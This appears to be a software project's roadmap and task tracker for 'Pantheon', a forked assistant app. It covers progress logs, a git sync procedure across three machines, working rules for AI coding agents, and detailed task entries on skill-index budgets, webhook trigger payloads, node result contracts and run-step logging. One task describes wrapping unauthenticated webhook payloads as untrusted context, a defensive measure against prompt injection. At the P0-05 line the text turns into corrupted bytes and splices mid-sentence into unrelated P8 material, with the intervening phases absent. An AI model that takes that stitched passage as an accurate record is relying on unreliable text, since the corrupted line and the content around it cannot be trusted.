`DECISIONS.md` D-2026-08-26-06 settles every open call and each task line now carries its own.
Five shifted under the scaling track — `P2-10` most of all, which flips from *delete the
concurrency guard* to *make it an admin control*, because "one operator cannot denial-of-service
themselves" stops being true the moment there is a second account. And `P13` loses the
force-directed graph entirely: permanence is the feature, a picture of it is not, and the
constellation was the exact part of a competitor's version that made it go unused. Edges stay as
data — an edge that only exists to be drawn is not worth storing.

### Two more laws, and a competitor's scar tissue turned into tasks
`Law 14` — extend the primary scaffolding, never build a second one — applied to this roadmap
first: receipts went into `P4` because `P4` already exists to render what the wire discards, and
the context budget into `P12`. `Law 15` — if it needs a tutorial, it is not finished — came from
a beta user abandoning a more advanced version of `P13` because the curve was too steep, and is
now `P13-00`, the acceptance criterion for that whole phase. Training parked (`D-06`), a
marketplace closed for good (`D-07`), `D-05` promoted to `P14 · Measurement` because four things
now block on it. Four hardening tasks mined from PandaOS's public changelog — the sharpest being
a silent decrypt failure followed by a destructive save that permanently lost user API keys.

### Law 13 written, the drift measured, the Brain scoped
The complaint was right and now it has a number: **78 `getElementById` targets resolve to
nothing**, across 16 prefixes and seven subsystems — the P2 audit found a handful of them by
hand. `check-wiring.py` counts it, Law 13 forbids adding to it, and `P3-13`/`P3-14` put a
ceiling on it that may fall and may never rise. `P13 · The Brain` scoped from the source:
memories have no confidence and no edges, but the skill extractor already scores 0..1 with a
0.6 floor, and `/timeline`, `/audit` and `/import` all exist — edges are the only genuinely
new thing.

### Forge named, RBAC scoped, training filed
`Cookbook` → **`Forge`** (`DECISIONS.md` D-2026-08-26-05); Olympus was rejected on positioning,
not aesthetics. RBAC grew four tasks after reading `core/auth.py`, which corrected two things
this tracker had wrong: the privileges **are** declared and **already carry quota primitives**
(`max_messages_per_day`, `allowed_models`), so P12 extends that dict rather than building a
parallel system; and authorization is one bit applied 84 times — `require_admin` 84 sites
against `require_privilege` 17. Training filed as `D-06`: fits, but adapters only.

### Scaling track opened — P11, P12, and the Cookbook rename
The deployment assumption changed from one admin on a LAN to real infrastructure. Two phases
added: identity and access (10 tasks — OIDC/SSO against a BYO provider, roles, and closing the
privilege fail-open at `auth_helpers.py:172`), and limits and the control plane (8 — every limit
is a process-wide env constant today, none per-role, none adjustable without a restart). Five
earlier decisions had "a second user account" as their voiding condition; `DECISIONS.md`
D-2026-08-26-04 records which move and which do not. Cookbook filed for rename as `P0-29` —
3,533 occurrences, larger than the Odysseus sweep was.

### Decision ledger — 18 open calls collected, awaiting answers
Everything blocked on a product call rather than a code question, gathered into one sheet with
measured findings, options and a recommendation each: nine finish P2, two re-land what run 01
pulled back, five gate the public flip, two are UI couplings. Nothing implemented pending answers.
→ https://claude.ai/code/artifact/021da439-f620-4d16-948d-36e30c314f53

### P2 run 01 — 10 implemented, 1 reverted, 1 blocked
Upload blocklist deleted, upload CSP sandboxed in the middleware, four dead config blocks and a
dead validator removed, `_is_text_file` widened 10 → 28, email decode fallback, a real `MAX_FILES`
cap, the heredoc contradiction, the grammar bug, and a 413 on the admin import. Suite: 5,742 pass
against 5,731 at baseline, same 44 pre-existing failures, zero regressions. Four bugs filed.
Rebuilt and live — app serving, `PANTHEON_BACKUP_IMPORT_MAX_BYTES` confirmed inside the
container. `1f5ec17 … 67decb5`

### R-06 closed + first implementation run launched
Pantheon's real tree is now in the cloud container at `/work/pantheon`, staged from cybertooth
as a 15 MB archive, checksum-verified, and baselined under git at `f4364bf` — 1,516 files,
confirmed identical to the fork on the accent counts (799 / 205 / 101). Agents edit the fork
itself now instead of reading upstream; `/work/base` stays as the b4d1293 reference. Seven
P2 file-ownership batches running, each with a refuter. `62bf5d2 … HEAD`

### Theme protection — P1-01 corrected before it shipped
The themes and their 7 canvas background animators are protected (`DECISIONS.md`
D-2026-08-26-03). Auditing that found P1-01 would have collapsed all 16 themes to one
accent colour; rewritten to set `--accent` per theme instead. `3bd293d … HEAD`

### Datastore audit — no change made, two decisions recorded
Measured the ChromaDB coupling (130 call sites, 2,110 LOC, 24 tests) and decided against a
swap: `DEFERRED.md` D-04. Filed D-05 — telemetry is the real TimescaleDB case — and B01,
the unpinned datastore image. Nothing in the source changed.

### Tracker consolidation + README — implemented
Sixteen empty handoff files and a stale duplicate note deleted; one tracker, one progress
area, and a `check-tracker.py` that fails on table drift. Twelve laws in `AGENTS.md`, eight
of them anti-drift, each citing its incident. README rewritten around the audit. `930bfb9 … HEAD`

### Setup · R-01 … R-06 — implemented
Repo created private at `ImPanick/pantheon`, upstream kept as a remote, full 2,077-commit
history. Rename swept, stack rebuilt, app serving as Pantheon. `ac65b63 … 930bfb9`

---

## Where things run

Three machines, and the tools do not reach the same one. This bit the first plan.

| Where | Reached by | Has | Lacks |
|---|---|---|---|
| Cloud build container | `Bash` | git, docker, network, `/work/base` | the fork's credentials |
| Cowork device VM | `device_bash` | the repo mounted r/w, git, python, node | network, docker, gh, **cannot delete files** |
| cybertooth (Windows) | `Windows-MCP` → Git Bash | **git, gh (auth), docker, network** | — |

**Edit files with `device_bash`. Do everything git, gh or docker through `Windows-MCP`.**
`device_bash` cannot unlink, so `sed -i`, `git commit` and `git gc` all fail there.

The fork is private, so agents cannot clone it. They read `/work/base` — upstream at
exactly `b4d1293`, the fork point — and hand back patches that cybertooth applies.

**Verifying a sync: compare `git rev-parse HEAD^{tree}` on both machines.** Two commits
with different messages, authors or timestamps still produce the same tree hash if the
files match, which makes it the right check for "did everything arrive". A checksum on
the tarball proves the transfer; the tree hash proves the *result*.

**Use a patch, not a bundle.** The two mirrors carry the same trees under *different commit
SHAs* — the container was seeded from a tarball, so its history is its own. A `git bundle` is
addressed by SHA and will not apply on cybertooth for that reason; `git format-patch
<base>..HEAD --stdout` is addressed by content and does. The 2026-08-29 sync ran:
`SendUserFile` → `device_commit_files` into `.pantheon-transfer/` → `md5sum` on both sides →
`git apply --check` → `git am --keep-non-patch --committer-date-is-author-date` →
`git commit --amend --author='ImPanick <…>'` (the container's git identity is not the repo's,
and `--reset-author` and `--author` cannot be passed together) → delete `.pantheon-transfer/` →
`git push`. Three checks, in order: the md5 matches, `git apply --check` is clean, and the tree
hashes agree afterwards.

*Confirmed useful on 2026-08-27.* It disagreed after a sync that had in fact worked:
1,532 files, **zero differing blobs**, and 1,484 files whose only difference was the
executable bit — the container mirror had been seeded from a tarball that set `+x` on
everything, so its index recorded `100755` where cybertooth has `100644`. Nothing wrong
was ever pushed, because cybertooth is the push source. `core.fileMode false` is now set
in the container so the seed cannot reintroduce it. **Do not skip this check because it
disagreed once for a boring reason** — the same disagreement with a differing *blob* is
the one that matters, and you cannot tell them apart without looking.

### Two upstream identities — settle before P0-14
Cloned from **`pewdiepie-archdaemon/odysseus`**; the code and docs referenced
**`odysseus-dev/odysseus`** (47 occurrences across 16 files). The sweep rewrote the second
to `ImPanick` and left the first alone. `NOTICE` and `CREDITS.md` name only the first.
Confirm which is canonical before the attribution files are final.

---

## How an agent picks up work

Read `AGENTS.md` first — it is the working agreement and it is short. This section is the
mechanical part.

**Task line format.** Every task is one line, parseable:

```
- [ ] **Px-yy** <what to do>. `Depends:` Px-aa. `CI:` <test that pins this>. `Verify:` <how you know it worked>.
```

`Depends:` is ordering. `CI:` names a test that asserts on this code — often on its
*source text* rather than its behaviour, so read the test before refactoring. `Verify:` is
the acceptance check, and it is the definition of done.

Ids in examples are always `Px-yy`, never a real one, so that counting the list never
picks up an illustration. `python3 .pantheon/check-tracker.py` recounts every tick,
checks each task sits under its own phase header, and fails if the status table has
drifted. Run it after any batch of ticks — a table that disagrees with the list sends
agents to redo finished work.

**Before starting a task**

1. Re-read the task against the source. If the premise is false, **stop and correct the
   line** — do not implement a task whose premise does not hold. This is `AGENTS.md`
   rule 3, and the P2 scout pass found it false often enough to matter.
2. Check `FORBIDDEN.md` Part 1 (names that cannot move) and Part 2 (controls that never
   lift). Check `DECISIONS.md` for a settled call on this task.
3. Claim it by flipping `[ ]` → `[·]` with your agent id. Release it if you stop.

**While working**

- Add, never subtract. If something has to go, say why on the task line.
- `static/` has **no bind mount**. A restart serves the old files —
  `docker compose up -d --build`, and bump the service-worker `CACHE_NAME`.
- Inline scripts need the CSP nonce. Add zero external requests.
- **No route in this app can set a CSP header** — the security middleware overwrites it.
  If a task tells you to set one at a handler, it is wrong.

**Definition of done**

A task is done when all four hold:

- [ ] the `Verify:` check passes
- [ ] `pytest -q` is green, or the failures are pre-existing and named
- [ ] `py_compile` across `app.py routes/ src/`, `node --check` on every touched module
- [ ] the tick is flipped to `[x]` with a one-clause trace on the line

**When a whole phase is done**

Write **one** entry in § Progress. Two lines and a commit range. Not a report — the
commit messages carry the detail, which is what they are for. Then set the phase's row in
the status table.

**Where things go**

| What | Where |
|---|---|
| A finished phase | one § Progress entry |
| A bug you found in passing | § Bugs, at the bottom |
| A premise that turned out false | corrected on the task line itself |
| A judgement call someone might re-litigate | `DECISIONS.md` |
| Anything else | the commit message |

---

Phases are ordered by dependency, not importance. **P0 → P1 → P3 are strictly
sequential.** P2 is independent and can run in parallel with anything from the start.
P4 gates P5. P8 depends only on P1.

**P11 and P12 are the scaling track** and depend on nothing in P0–P10. They exist because the
deployment assumption changed: this was planned for one admin on a home LAN, and it is now
being planned to survive real infrastructure with real users. Several settled decisions named
"a second user account" as their voiding condition — those conditions are now foreseeable
rather than hypothetical, and `P11-09` is where that debt comes due.

---

# P0 · Fork identity & licence
*Area: `identity`, `release` · Blocks: everything*

The rename is ~2,900 occurrences across 371 files, of which ~150 identifiers are
load-bearing.

**Deployment reality, corrected 2026-08-28.** This phase was written for one self-created
admin account on a home LAN with disposable data, and that is still where it runs today — so
everything already swept under that assumption stays swept. But the assumption itself was
superseded: the owner asked to plan around someone scaling into real infrastructure, and
`P11`/`P12` exist because of it. **Every rename still open — `P0-29`, `P0-31` — decides per key
whether a read-old-write-new path is needed, and records that decision on its own row.**
`P0-31`'s `Verify:` line already accepts "a migration path reading the old key"; this paragraph
used to forbid one.

**Nothing is purged.** `P0-05` below measured the live instance: two collections, both already
under the new names, and `pantheon_memories_fastembed` holds real memories. Re-index what is
genuinely empty and log back in. The only manual step is one line in your `.env`.

`scripts/pantheon-init.sh` does the mechanical sweep. Review its diff before committing.

- [x] **P0-01** Create `.pantheon/` with `AGENTS.md`, `ROADMAP.md`, `FORBIDDEN.md`, `DEFERRED.md`, `handoff/`. Seed one empty handoff file per area. — **done:** the directory exists; the sixteen empty handoff files were deleted in favour of § Progress.
- [x] **P0-01b** Run `scripts/pantheon-init.sh --dry-run`, read the diff, then run it for real. It does P0-02, P0-03, P0-04, P0-06, P0-07, P0-08, P0-10 and P0-11 as one reviewable sweep, with the attribution files excluded. Everything after it is by hand. — **done:** swept, 373 files, 2,615 in / 2,615 out, 37 path renames.
- [x] **P0-02** Rename cosmetic surfaces: page titles, wordmark text in `index.html` + `login.html`, 111 UI strings across `static/js/`, tray menu in `launcher.py`, `setup.py` banner. `Verify:` grep for case-insensitive `odysseus` in `static/` returns only attribution strings. — **done:** verified — `git grep -icI odysseus -- static/` returns one hit, the protected provenance link in `cookbook.js`.
- [x] **P0-03** Rename env prefix `ODYSSEUS_*` → `PANTHEON_*` (**103 distinct names, 574 refs** — re-measured 2026-08-27 post-sweep, scope: `PANTHEON_*` in tracked files excluding `.pantheon/`; the pre-sweep estimate of 99 / 560 undercounted). Update `.env.example`, `docker-compose*.yml`, `Dockerfile`, `docs/`, **and your live `.env` on the host** — that one file is the entire migration. No shim. `Verify:` app boots with only `PANTHEON_*` set. — **done:** code and live `.env`; only `PANTHEON_ADMIN_USER`/`PASSWORD` existed on the host, and both are read solely at first-boot admin creation.
- [x] **P0-04** Rename browser storage keys (113 distinct, 206 refs in `static/`). Costs you one theme re-pick and a layout reset. `CI:` none. — **done:** verified — no `ody-`/`ody.` keys remain in `static/`.
- [ ] **P0-05** **Corrected — there is nothing to drop.** The previous entry claimed th�}8�f��(�+my�t. `CI:` `tests/test_skill_retrieval_normalises_by_the_query.py` (13 tests, including the labelled-set recall/precision floors and the `Law 1` invariant over the whole library). **Mutation: 12 real mutations, 12 caught, plus one no-op control that survived as designed** — reverting to union Jaccard, dropping the `max`, dropping the tie-break, dropping either side's hyphen split, raising the sub-token length floor, removing the stopword list, making a stopword-only query match everything, and reverting the call site. `Depends:` nothing. — agent:`p8skills`
- [x] **P8-21** *(Stretch)* Budget the index. It costs ~15 tokens per published skill on **every single request** and participates in no budget. Also: the usage counter records *retrievals*, not successes, so "most-used" measures keyword luck. — **done 2026-09-19. Both halves of the first sentence were wrong, in opposite directions.** **The cost is 5.6× the row's figure.** Measured by publishing the whole bundled library into a fresh store and rendering the real block through `render_skill_index_block`: **286 entries, 80,610 characters, 24,187 tokens** by the product's own `model_context.estimate_tokens` — **84.6 tokens per entry**, median entry line 275 characters, longest 1,001. Not 15. The block alone is **four times** the 6,000-token default `agent_input_token_budget`, and nothing anywhere trimmed it. **And it is not "every single request".** All 286 bundled skills parse with `status: draft` — their frontmatter carries no `status:` and `Skill.from_markdown` defaults to draft — and `index_for` admits only published skills plus teacher-escalation drafts, so a **stock install renders 0 entries and 0 characters**. The cost arrives on the first publish click and then grows without bound, which is what the budget is for rather than against. `src/context_budget.py` is extended, not duplicated: the module already holds two families (the token budget at the top, `P12-04`'s six character budgets at the bottom) and this is a third, `PROMPT_BUDGETS`, resolved through the same `limit_policy.resolve_int_limit` and the same four layers, registered in `src/settings.py` beside the six. It is deliberately **not** clamped to `context_attachment_total_chars`: those six share a ceiling because they are one turn's attachments, and a catalogue the model is shown is not competing with a PDF somebody dropped in — clamping it there would mean lowering an attachment budget silently truncated a skills catalogue, which is the ambiguity `Law 10` refuses. The default is 12,000 characters, which binds at roughly 43 entries of the measured median and therefore **changes nothing for any install that exists today**. The cut is applied in `skill_injection.render_skill_index_block`, which is `P8-06`'s one renderer, so the agent loop and `GET /api/skills/index` are both bounded without either of them asking and the preview still shows the prompt rather than a drawing of it. Entries are dropped **whole**, lowest-value first, and what survives renders in the ordinary category order, so a truncated block has the same shape as a full one — and the model is **told**: a truncated catalogue with no note makes a model conclude the missing skills do not exist, so the block ends with how many are installed and unlisted and the two actions that reach them. Driven on the real library: **80,610 → 11,692 characters, 24,187 → 3,511 tokens, 39 listed and 247 named** (`Law 20`). **The counter is the second half and it was a feedback loop, not just a misnomer.** `record_use` is called from `agent_loop._build_system_prompt` for every skill the retriever *emitted*, before the model has read a word — and `get_relevant_skills` then multiplied a skill's score by **1.05 when `uses > 0`**, so one keyword coincidence bought a permanent advantage in the next match, compounding luck into rank. `uses` is untouched (`Law 1`, `Law 2`: it is on the wire, on the card and in three sort orders) and still counts retrievals, and now says so in its own docstring. `opens` is the new counter, written only by `manage_skills action=view` — the model fetching the whole SKILL.md after seeing an index line that carries three fields, which is a decision rather than a side effect. It is not "the skill worked"; nothing in this product knows that. It is the best signal that exists, it is the one the 1.05 boost is earned by now, and it is what decides who survives the catalogue cut. **What the merge still needs (`static/**`, not in this patch):** the prompt preview already fetches `GET /api/skills/index`, whose response now carries `budget: {chars, tokens, budget_chars, truncated, omitted, listed}` — it should draw *"3,511 of 12,000 characters · 39 of 286 skills listed"* with the omitted count beside it, because a person whose catalogue is being cut has no other way to find out; and the card's *"used N times"* should read *"matched N times · opened M times"* from the `uses`/`opens` pair `GET /api/skills` now returns, which is the whole point of having measured them separately. `Verify:` someone who has never read this tracker publishes forty skills, opens the prompt preview, and can see what their catalogue is costing the model against what it is allowed to cost — and the assistant, handed a shortened list, says there are more and fetches them instead of saying the skill does not exist. `CI:` `tests/test_the_catalogue_costs_what_it_costs.py` (18 tests). — agent:`p8c`
### Automations
- [x] **P8-22** Node palette endpoint — merge the three `/meta/*` routes, move the client-side
  category/icon taxonomy server-side, emit param schemas and a `model_backed` flag (currently
  maintained twice: once to gate the semaphore, once to draw a badge). **A defect this row
  inherits and nobody had recorded** (found 2026-08-27, AST-verified): `BUILTIN_ACTIONS` holds
  **18** entries and `BUILTIN_ACTION_INFO` holds **16**, so `run_local` and `cookbook_serve` exist
  and are **never offered by `/meta/actions`**. Two working actions are invisible to the palette.
  Reconcile the pair in the same commit — that is the merge's whole point (`Law 7`).
  — **Re-measured 2026-09-18 and the numbers held: 18 and 16, AST-counted, missing exactly
  `run_local` and `cookbook_serve`.** The pair is reconciled. `src/builtin_actions.py` carries
  one `BUILTIN_ACTION_META` and `BUILTIN_ACTION_INFO` / `MODEL_BACKED_ACTIONS` are derived from
  it; `TaskScheduler._action_needs_model()` reads the registry.
  **Premise corrected 2026-09-18 — "merge the three `/meta/*` routes" was implemented as a merge
  of the BUILDER, not of the URLs, and deliberately.** A fourth endpoint no page fetches is a
  route with no caller (`Law 13`), and `.pantheon/check-unreachable.py` measures it. So the
  taxonomy, the reconciliation and the param schemas landed on the doors already called.
  — **client half closed 2026-09-18 (second wave). Every line number in the open half was
  re-measured against `1fe7c19` and every one held** — `_fetchActions` `:219`, `_TASK_ICONS`
  `:485`, `_taskIcon` `:515`, `_MODEL_BACKED_ACTIONS` `:524`, `_taskAiMark` `:537`,
  `_CATEGORY_MAP` `:660`, `_CATEGORY_ORDER` `:687`, `_categoryFor` `:703`, and all seven buster
  sites. **One count did not**: `_CATEGORY_MAP` held **20** action→category entries, not 19
  (counted from its own lines, `Law 6`); two of them, `tidy_calendar` and `ping_events`, were for
  actions that no longer exist, which is the row's point and one entry sharper than it said.
  All three copies are gone. `_TASK_ICONS` keeps every shipped SVG path and is **re-keyed by the
  server's sixteen semantic icon names** — verified identical to the set
  `BUILTIN_ACTION_META` picks from — plus the two fallbacks, and gains `terminal` and `book`,
  which is what makes the re-key more than cosmetic: `ssh_command`, `run_script`, `run_local` and
  `cookbook_serve` were keyed by nothing and drew the generic gear. `_categoryFor`, `_taskIcon`
  and `_taskAiMark` read `_actionNode(name)`; `_categoryOrder()` is `data.categories`, the same
  eleven names in the same order, stated once in `ACTION_CATEGORY_ORDER`. Before the palette
  lands every reader falls back — `Other`, the gear, no badge, no order — and the list re-renders
  when it arrives, so the first paint of a cold modal is never an exception.
  **The form's missing box was the largest single gap and the row understates it.** Four
  built-ins declare a parameter and the form had a box for **none** of them: `syncActionExtra`
  returned early for anything outside `_EMAIL_ACCOUNT_ACTIONS`, so an admin picking `run_local`
  saved a task with an empty `prompt` and learned about it when it fired. The field is drawn from
  `node.params[0]` — `label`, `type` (`text`/`json` get a textarea), `description` — and
  `_actionPromptValue(action)` reads it back on save, refusing an empty `required` one.
  `cookbook_serve` now says *"Serve config"* and `run_local` says *"Script"* without anyone
  knowing which is which.
  **Two client-side retirements, stated rather than discovered later.** A stored task holding
  `tidy_calendar` or `ping_events` now files under `Other` with the gear instead of under
  `Calendar` with a calendar — which is the honest answer, since neither is in `BUILTIN_ACTIONS`
  and neither can run. And the 145-line anonymous save handler is now `const _saveTaskForm`,
  because a closure nothing can name is a closure no stack trace and no test can refer to.
  Cache-buster `20260723tasksbulkfeedback1` → `20260918palettesteps1` at **all seven** import
  sites — `static/sw.js:140`, `static/app.js:33`, `static/js/calendar.js:2962`,
  `static/js/cookbookSchedule.js:59`, `static/js/chatRenderer.js:1811`,
  `static/js/settings.js:3164`, `static/js/chat.js:7911` — plus `CACHE_NAME`
  (`pantheon-v420-p8-workshop-preview` → `pantheon-v421-p8-palette-steps`). A repo-wide grep for
  the old string returns nothing, and a repo-wide grep for `tasks.js` finds no eighth loader,
  static or dynamic (`D-01`'s contract; the `presets.js` and seven-site cases are why it was
  grepped for `import(` as well as for the literal).
  **One test had to move with the taxonomy, and it got longer rather than weaker.**
  `test_the_task_category_agrees_with_itself` (`tests/test_the_product_noun_is_forge.py`) and its
  node harness `tests/harness/forge_labels.js` sliced `_CATEGORY_MAP`, `_CATEGORY_ORDER` and
  `_CATEGORY_ICONS` out of `tasks.js` and `eval`'d them, to check the category name joined all
  three. Two of the three are now the server's, so the harness reports the browser's half and the
  test reads the other two out of `build_action_palette()` and `ACTION_CATEGORY_ORDER` — **the
  join it asserts on now spans the wire**, which is where it lives. It also gained two checks that
  were impossible before, because the client's own table used to be the answer it was checked
  against: every category the registry names has a glyph, and every `icon` a node names has a
  path.
  `Verify:` an admin who has never opened Tasks clicks **New → Action**, finds all eighteen
  built-ins, can tell from the picker which use a model and what group each belongs to, and — for
  the four that need one — is given a labelled box with a sentence saying what goes in it, rather
  than saving a task that does nothing.
  `CI:` `tests/test_node_palette.py` (server) · `tests/test_the_palette_moves_to_the_server_js.py`
  (client). — agent:`p8auto` (server) / `p8ui2` (client)
- [x] **P8-23** **Give triggers payloads.** The event bus takes a name and an owner — a "document created" trigger cannot say *which* document. The webhook route has **no request parameter**: body, query and headers are read by nobody. It is a doorbell. **Highest-leverage change in Automations; everything downstream depends on it.** Do not change the webhook URL shape — it is CI-pinned.
  — **done 2026-09-18, and both halves of the premise were exactly true.** Measured before touching either: `fire_event(event_name, owner)` was the whole signature (`src/event_bus.py`), and `webhook_trigger(task_id: str, token: str)` took no `Request` at all. `B602` is closed by this row: **all eight** catalogued events now carry a payload, not the four it names, because four producers with payloads and four without would be the ninth spelling the registry exists to prevent. **21 `fire_event` call sites** in tracked non-test source — AST-counted, `tests/` and `.pantheon/` excluded — and all 21 pass one.
  **The catalogue is the schema.** Each `EVENT_CATALOGUE` entry declares `payload` (the field list) and `payload_summary` (the same fact in English, for the picker), and `build_trigger` (`src/event_bus.py:157`) keeps exactly the declared keys and drops the rest. So a producer cannot invent a field, and `EVENT_PAYLOAD_FIELDS` (`:103`) is a schema rather than documentation (`Law 10`). `document_created` and `document_updated` carry `document_id` + `title`; `memory_added` carries `memory_id` + `text`; `research_completed` carries `session_id` + `topic`; `email_received` carries `account` + `folder` + `message_key`; `session_created` carries `session_id` + `name`; `message_sent` carries `session_id` + `text`; `skill_added` carries `name`.
  **The webhook is not a doorbell any more and its URL did not move.** `_webhook_payload` (`routes/task/task_routes.py:1235`) reads body, query and an **allowlist of five headers**, and a JSON body is parsed where it parses so a task can be told `data.json.issue.title` without re-parsing a string. The allowlist is the security half: `x-hub-signature-256` and `authorization` are deliberately absent, because this payload ends in a model prompt and in a row somebody reads. `request` is the **third** positional parameter, after the two path parameters — FastAPI resolves it by type, the URL shape is byte-identical, and three existing tests that call the handler as `webhook_trigger(task_id, token)` keep working with one argument added.
  **The payload reaches the model as data, never as instructions.** `trigger_context_message` (`:211`) wraps it with `src.prompt_security.untrusted_context_message`, `provenance_origin="external"`, `arm_tool_gate=True` — so `messages_contain_external_untrusted_context` sees it and **the post-external blocked-effect gate arms for a run that has a payload** (`FORBIDDEN.md` Part 2, kept rather than widened). It has to: the webhook route is unauthenticated, and `document_updated` is fired by the email MCP server merging a **received** draft into a document, so "which document" can be a title somebody else wrote. A run with no payload builds a byte-identical message list to the one it built before this row (`Law 1`), which is every scheduled run in the product.
  **`Law 15`, which is what `P8-00` asks for:** the run's step log leads with what fired it — `Triggered by document_updated — document_id=doc-42, title=Q3 plan` — as step one, before anything the run did.
  **What the merge still needs, and it is `static/**` so it is not in this patch:** `_renderRunSteps` (`static/js/tasks.js:2079`) maps every non-`tool` step to the literal word `progress`, so a `kind: "trigger"` step draws its detail correctly under a label that says "progress". One line: give `trigger` its own branch and its own word. And `/api/tasks/meta/events` now serves `payload_summary` per event, which `_populateEventPicker` (`static/js/tasks.js:437`) should append to `#task-form-event-desc` beside the description so someone choosing a trigger knows what they will be able to refer to before they write the prompt.
  `Verify:` someone who has never opened Tasks builds "when a document is updated, summarise it", edits a document, and the task summarises **that** document — then opens the run and can see, without being told where to look, which document set it off.
  `CI:` `tests/test_trigger_payloads.py`. — agent:`p8b`
- [x] **P8-24** Widen the node output contract from `(text, success)` to `(payload, status)` with a back-compat adapter for the 18 existing actions. The no-op and defer-with-backoff signals already encode skip and retry — generalise them.
  — **done 2026-09-18. The 18 re-measured and it is still 18** — AST-counted from `BUILTIN_ACTIONS`'s own keys, and `BUILTIN_ACTION_META` now holds the same 18 since `P8-22` reconciled them, so the adapter covers the registry exactly.
  `NodeResult` (`src/builtin_actions.py:477`) carries `status`, `payload`, `text` and `retry_after`. `coerce_node_result` (`:549`) is the adapter and it runs **one way only**: whatever a node returned becomes a `NodeResult`, and `as_legacy()` exists for a caller not yet widened. Nothing produces the old pair from new code, which is the `Law 13` line this row is warned about — an adapter that also accepts the old shape on the consumer side would make `(text, bool)` a supported return type for ever.
  **`Law 14`: the skip and retry vocabulary is the one the engine already had.** `NODE_STATUSES` is `('success', 'error', 'skipped', 'deferred')`; `skipped` **is** `TaskNoop` and `deferred` **is** `TaskDeferred`, converted by `from_signal`/`as_signal`, and `_execute_task_locked` raises what comes back so its existing `except TaskNoop` and `except TaskDeferred` blocks stay the only code that writes a no-op row or pushes `next_run`. A status outside the four raises at construction. `aborted` is deliberately not a node status: being stopped is done **to** a run, never decided by a step.
  **`B600` closes here, because the row says it belongs here.** `agent_loop.tool_outcome` (`src/agent_loop.py:197`) states an outcome for every tool from the signals it actually carries — `error`, then `success`, then `exit_code` — and `tool_output` ships it as `status`. It is a **string** on purpose: `static/js/chat.js:3836` treats any streamed event with `status >= 400` as a terminal stream error, and a number there would have killed every tool stream. The step log reads the explicit value and falls back to the old `exit_code` test for an event that predates the field, so a saved stream still reads correctly. Before this, `exit_code` was set by the shell and python branches of `_direct_fallback` and by nothing else, so ~70 tools reported `ok` whatever happened.
  `Verify:` someone who has never opened Tasks runs a task whose web fetch 404s, opens the run, and the failed step is marked as failed — instead of `ok` beside the thing that did not work.
  `CI:` `tests/test_node_output_contract.py`. — agent:`p8b`
- [x] **P8-25** **Write `TaskRun.steps`** — declared, never written. A run records one result string
  for the whole task. Filling it upgrades the shipped activity view instantly with no new UI. —
  **BLOCKED (2026-08-27): "migrated" is false.** There was **no `ALTER TABLE task_runs ADD COLUMN
  steps` anywhere in the tree**.
  — **UNBLOCKED 2026-09-18.** `_migrate_add_task_run_steps_column` is modelled line for line on
  `_migrate_add_task_run_model_column` and runs from `init_db`.
  **Premise corrected 2026-09-18 — "with no new UI" was not true, and could not have been.**
  `_run_to_dict` did not serialise `steps`. The wire carries it now: `GET /api/tasks/{id}/runs`
  returns `steps` parsed and `step_count`, `/runs/recent` returns `step_count` with `steps`
  emptied. Both executors write it. Capped at 200 steps and 400 characters a field.
  — **client half closed 2026-09-18 (second wave), and the function the row names does not
  exist.** There is no `_renderRunHistory` in the tree and there never was: the renderer is
  **`_showRunHistory`, `static/js/tasks.js:1908`**, and the cited range `:1947-1955` is the
  `.task-run-item` template inside it, which is right — `.task-run-result` sits at `:1953`. Name
  invented, lines correct.
  `_renderRunSteps(run)` draws the log under the result line: a `<details>` whose summary is
  *"6 steps · 1 did not finish"* — collapsed, because the run worth reading is one in a list of
  twenty and the summary is what makes it findable — over one `<li>` per step. A `progress` step
  shows its `detail`; a `tool` step shows tool, round, command, status and output, and an `error`
  or `blocked` one is marked by a left rule and a weight as well as a hue, because the failed
  step is why the log was opened and colour alone does not survive a colour-blind reader. A run
  with no steps — every run written before the migration, and every genuine no-op — draws
  nothing, rather than a `0 steps` disclosure on every row of a history. Activity rows carry
  `stepCount` from `/runs/recent` and a `6 steps` chip that opens **that task's own history**
  (`_openStepLogFor`), so there is one renderer for the steps and the chip is a door to it; a
  registered Activity source's row with no task behind it (`P6-07`) gets no chip.
  **A defect in the test helper `Law 20` recommends, found here and fixed here.**
  `js_function` (`tests/test_a_draft_skill_is_uncatalogued_not_inactive.py`) resolved a function
  body by brace balance with quotes skipped — and treated every `'` as a string delimiter,
  including the ones in `// the app's whirlpool` and `// poll's next render`. This repo's comments
  are English prose. Measured on `static/js/tasks.js`:
  `js_function(src, "function _wireActivityRows")` raised `unbalanced braces` (loud, and the only
  reason it was noticed) and `js_function(src, "function renderTriggerOpts")` returned a
  **1,434-line** body for a 215-line function — balanced, plausible, and silently file-wide. Every
  `Law 20` option-2 assertion made inside such a scope was a file-wide grep wearing a scope's
  clothes, which is the failure `Law 20` exists to stop. `_js_skip` now steps over line comments,
  block comments, strings and template literals; the four existing callers across three files are
  green, and two of them were over-scoped before.
  **`tests/harness/activity_row_status.js` had to learn about both new functions**, and the way
  it failed is the argument for how it is written: it slices `_showRunHistory` out of `tasks.js`
  by source anchors and runs it, so the moment the history called `_renderRunSteps` the harness
  threw `ReferenceError` and took five `test_run_status_is_one_vocabulary.py` cases with it.
  Both helpers are now **sliced, not stubbed**, for that file's own standing reason — a stub would
  report the harness's markup, and `_showRunHistory` calls `_renderRunSteps` unconditionally, so a
  stubbed one would go green on a history that had stopped drawing the log at all.
  `Verify:` someone who has never opened Tasks clicks a finished task, reads its last run, and can
  say what it actually did — which tools it called, in what order, and which one failed — without
  being told where to look; and from the Activity list can tell which rows have a log at all.
  `CI:` `tests/test_task_run_steps_migration.py` (server) ·
  `tests/test_the_palette_moves_to_the_server_js.py` (client). — agent:`p8auto` (server) /
  `p8ui2` (client)
- [x] **P8-26** Add the graph document. One nullable successor today; the cycle check doubles as a **silent depth cap of ten**. Project the existing successor as a single edge on read.
  — **done 2026-09-18. Both halves of the premise held exactly**: `ScheduledTask.then_task_id` was the whole graph, and `_has_chain_cycle(db, start_id, max_depth=10, owner=None)` returned `True` from a loop that had simply run out of steps.
  `task_edges` (`src/task_scheduler.py:129`) and `build_task_graph` (`:144`) project the successor at read time. **There is no new column and no stored graph**, so a chain and a drawing of it cannot disagree (`Law 14`), and `then_task_id` keeps its name and its readers (`Law 1`). `build_task_graph` takes the rows the caller already queried rather than a session, so there is no second query answering the same question (`Law 7`), and an edge pointing outside the set is kept and marked `dangling` — reachable on the default screen, since the list filters by `status` and a chain into a paused task leaves the set while the row is still there.
